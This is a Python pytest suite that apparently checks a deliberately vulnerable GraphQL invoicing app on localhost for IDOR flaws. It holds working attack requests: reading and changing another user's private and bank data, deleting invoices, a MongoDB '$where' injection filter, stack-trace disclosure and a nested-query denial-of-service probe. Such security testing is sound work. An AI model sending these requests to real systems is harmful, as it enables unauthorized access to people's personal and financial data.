import json
import logging
import time

import pytest
import requests

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

BASE_URL = "http://localhost:3000/graphql"


@pytest.fixture(scope="session")
def auth_tokens():
    """Create users and get their auth tokens"""

    def get_user_token(username, password, role=None):
        # Try to login first
        login_mutation = """
        mutation Login($username: String!, $password: String!) {
            login(username: $username, password: $password) {
                token
                user {
                    id
                    username
                    role
                }
            }
        }
        """
        login_vars = {"username": username, "password": password}

        login_result = send_graphql_query(login_mutation, variables=login_vars)
        if (
            "errors" not in login_result
            and "data" in login_result
            and login_result["data"]["login"]
        ):
            logger.info(f"Successfully logged in as {username}")
            return {
                "token": login_result["data"]["login"]["token"],
                "id": login_result["data"]["login"]["user"]["id"],
            }

        logger.info(f"Login failed for {username}, trying registration")

        # If login fails, try to register
        register_mutation = """
        mutation Register($input: RegisterInput!) {
            register(input: $input) {
                token
                user {
                    id
                    username
                    role
                }
            }
        }
        """
        register_vars = {
            "input": {"username": username, "password": password, "role": role}
        }

        register_result = send_graphql_query(register_mutation, variables=register_vars)
        if "errors" in register_result:
            logger.error(
                f"Failed to register user {username}: {register_result['errors']}"
            )
            raise Exception(f"Failed to get token for {username}")

        logger.info(f"Successfully registered new user {username}")
        return {
            "token": register_result["data"]["register"]["token"],
            "id": register_result["data"]["register"]["user"]["id"],
        }

    # Get tokens for both admin and normal user
    admin_creds = get_user_token("admin", "admin123", "admin")
    user_creds = get_user_token("test", "test123")

    return {"admin": admin_creds, "user": user_creds}


def send_graphql_query(query, variables=None, token=None):
    """Helper function to send GraphQL queries"""
    headers = {
        "Content-Type": "application/json",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"

    payload = {"query": query, "variables": variables or {}}
    logger.debug(f"Sending GraphQL request: {json.dumps(payload, indent=2)}")

    response = requests.post(BASE_URL, json=payload, headers=headers)
    result = response.json()

    logger.debug(f"GraphQL response: {json.dumps(result, indent=2)}")

    if "errors" in result:
        logger.error(f"GraphQL errors: {result['errors']}")

    return result


def test_user_data_idor(auth_tokens):
    """Test Case 1: Basic User Data IDOR
    An attacker can fetch any user's data without authorization
    """
    query = """
    query GetUser($id: ID!) {
        user(id: $id) {
            username
            role
            createdAt
        }
    }
    """
    variables = {"id": auth_tokens["admin"]["id"]}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["user"] is not None
    assert result["data"]["user"]["role"] == "admin"


def test_private_data_idor(auth_tokens):
    """Test Case 2: Sensitive Data IDOR
    An attacker can access private user data without proper authorization
    """
    query = """
    query GetUserPrivateData($userId: ID!) {
        userPrivateData(userId: $userId) {
            email
            phone
            bankAccount
            taxId
        }
    }
    """
    variables = {"userId": auth_tokens["admin"]["id"]}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["userPrivateData"] is not None
    assert "bankAccount" in result["data"]["userPrivateData"]


def test_admin_access_idor(auth_tokens):
    """Test Case 3: Admin Access IDOR
    A normal user can access admin-only data
    """
    query = """
    query GetAllUsers {
        allUsers {
            id
            username
            role
        }
    }
    """
    result = send_graphql_query(query, token=auth_tokens["user"]["token"])
    assert "data" in result
    assert isinstance(result["data"]["allUsers"], list)
    assert len(result["data"]["allUsers"]) > 0


def test_invoice_access_idor(auth_tokens):
    """Test Case 4: Invoice Access IDOR
    An attacker can access any invoice without ownership verification
    """
    # First create an invoice as admin
    mutation = """
    mutation CreateInvoice {
        createInvoice(input: {
            issueDate: "2024-01-01",
            dueDate: "2024-02-01",
            items: [{
                description: "Test Item",
                quantity: 1,
                unitPrice: 100
            }]
        }) {
            id
        }
    }
    """
    result = send_graphql_query(mutation, token=auth_tokens["admin"]["token"])
    invoice_id = result["data"]["createInvoice"]["id"]

    # Now try to access it with normal user token
    query = """
    query GetInvoice($id: ID!) {
        invoice(id: $id) {
            invoiceId
            items {
                description
                quantity
                unitPrice
            }
            client {
                name
                email
            }
        }
    }
    """
    variables = {"id": invoice_id}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["invoice"] is not None


def test_mass_assignment_idor(auth_tokens):
    """Test Case 5: Mass Assignment IDOR
    An attacker can inject arbitrary MongoDB queries
    """
    # Try to fetch all invoices by injecting a query
    query = """
    query SearchInvoices($filter: String!) {
        searchInvoices(filter: $filter) {
            invoiceId
            amountPaid
        }
    }
    """
    variables = {"filter": '{"$where": "return true"}'}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert isinstance(result["data"]["searchInvoices"], list)
    assert len(result["data"]["searchInvoices"]) > 0


def test_profile_update_idor(auth_tokens):
    """Test Case 6: Profile Update IDOR
    An attacker can update any user's profile
    """
    # Generate a unique username using timestamp
    unique_username = f"hacked_{int(time.time())}"

    mutation = """
    mutation UpdateUserProfile($userId: ID!, $newUsername: String!) {
        updateUserProfile(
            userId: $userId,
            newUsername: $newUsername
        ) {
            id
            username
            role
            createdAt
        }
    }
    """
    variables = {"userId": auth_tokens["admin"]["id"], "newUsername": unique_username}

    # First verify the current username
    query = """
    query GetUser($id: ID!) {
        user(id: $id) {
            username
        }
    }
    """
    before_result = send_graphql_query(
        query,
        variables={"id": auth_tokens["admin"]["id"]},
        token=auth_tokens["user"]["token"],
    )
    logger.info(f"Current username: {before_result['data']['user']['username']}")

    # Try to update the username
    result = send_graphql_query(
        mutation, variables=variables, token=auth_tokens["user"]["token"]
    )

    logger.info(f"Update result: {json.dumps(result, indent=2)}")

    assert "data" in result, f"No data in response: {result}"
    assert result["data"]["updateUserProfile"] is not None, f"Update failed: {result}"
    assert result["data"]["updateUserProfile"]["username"] == unique_username

    # Verify the username was actually changed
    after_result = send_graphql_query(
        query,
        variables={"id": auth_tokens["admin"]["id"]},
        token=auth_tokens["user"]["token"],
    )
    assert after_result["data"]["user"]["username"] == unique_username


def test_invoice_deletion_idor(auth_tokens):
    """Test Case 7: Invoice Deletion IDOR
    An attacker can delete any invoice
    """
    # First create an invoice as admin
    create_mutation = """
    mutation CreateInvoice {
        createInvoice(input: {
            issueDate: "2024-01-01",
            dueDate: "2024-02-01",
            items: [{
                description: "Test Item",
                quantity: 1,
                unitPrice: 100
            }]
        }) {
            id
        }
    }
    """
    result = send_graphql_query(create_mutation, token=auth_tokens["admin"]["token"])
    invoice_id = result["data"]["createInvoice"]["id"]

    # Now try to delete it with normal user token
    delete_mutation = """
    mutation DeleteInvoice($invoiceId: ID!) {
        deleteInvoice(invoiceId: $invoiceId)
    }
    """
    variables = {"invoiceId": invoice_id}
    result = send_graphql_query(
        delete_mutation, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["deleteInvoice"] is True


def test_predictable_ids_idor(auth_tokens):
    """Test Case 8: Predictable IDs IDOR
    An attacker can guess IDs to access private data
    """
    # First try direct access with user ID
    query = """
    query GetUserPrivateData($userId: ID!) {
        userPrivateData(userId: $userId) {
            id
            email
            bankAccount
            taxId
        }
    }
    """
    variables = {"userId": auth_tokens["admin"]["id"]}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["userPrivateData"] is not None
    assert result["data"]["userPrivateData"]["id"].startswith("PRIVATE-")

    # Now try with predictable ID pattern
    predictable_id = result["data"]["userPrivateData"][
        "id"
    ]  # Use the ID from previous response
    variables = {"userId": predictable_id}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["userPrivateData"] is not None
    assert "bankAccount" in result["data"]["userPrivateData"]
    assert "taxId" in result["data"]["userPrivateData"]


def test_error_information_disclosure(auth_tokens):
    """Test Case 9: Error Information Disclosure
    The API returns detailed error messages that could be useful for attackers
    """
    query = """
    query GetUser($id: ID!) {
        user(id: $id) {
            username
        }
    }
    """
    variables = {"id": "invalid-id"}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "errors" in result
    assert "extensions" in result["errors"][0]
    assert "stacktrace" in result["errors"][0]["extensions"]
    # Verify that we get detailed error information
    stacktrace = result["errors"][0]["extensions"]["stacktrace"]
    assert len(stacktrace) > 0
    assert any(
        "CastError" in line for line in stacktrace
    )  # Check for MongoDB error details


def test_query_depth_attack(auth_tokens):
    """Test Case 10: Query Depth Attack
    The API allows deeply nested queries that could cause DoS
    """
    query = """
    query GetUser($id: ID!) {
        user(id: $id) {
            id
            username
            privateData {
                id
                username
                bankAccount
                user {
                    id
                    username
                    privateData {
                        id
                        username
                        bankAccount
                        user {
                            id
                            username
                            privateData {
                                id
                                username
                                bankAccount
                            }
                        }
                    }
                }
            }
        }
    }
    """
    variables = {"id": auth_tokens["admin"]["id"]}
    result = send_graphql_query(
        query, variables=variables, token=auth_tokens["user"]["token"]
    )
    assert "data" in result
    assert result["data"]["user"] is not None

    # Verify we can access deeply nested data
    nested_data = result["data"]["user"]["privateData"]["user"]["privateData"]["user"][
        "privateData"
    ]
    assert nested_data["bankAccount"] == "BANK-1234-5678"

    # Verify circular references
    assert (
        result["data"]["user"]["id"]
        == result["data"]["user"]["privateData"]["user"]["id"]
    )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
